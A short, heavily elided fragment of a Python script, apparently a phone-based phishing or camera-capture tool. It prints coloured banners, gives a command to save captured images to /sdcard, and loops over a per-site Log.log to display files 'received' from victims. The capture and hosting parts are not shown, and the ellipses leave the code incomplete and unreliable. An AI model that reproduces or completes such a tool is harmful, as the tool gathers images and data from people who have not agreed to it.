...
import requests
print('\033[1;32m<<<<Chaking requirments>>>>')
...
print()
print(cyan+'['+white+'+'+cyan+']' +parple+' For save image command : '+yellow+' mv image path.png /sdcard/')
print()
print(cyan+'['+yellow+'+'+cyan+']' +green+' For stop this process press CTRL+C...')
print()
while True:
	...
	if os.path.isfile("site/"+website+"/Log.log")==True:
		abir=open("site/"+website+"/Log.log","r")
		for i in abir:
			print(cyan+'['+yellow+'+'+cyan+']' +green+' Came File Receved'+green+i)
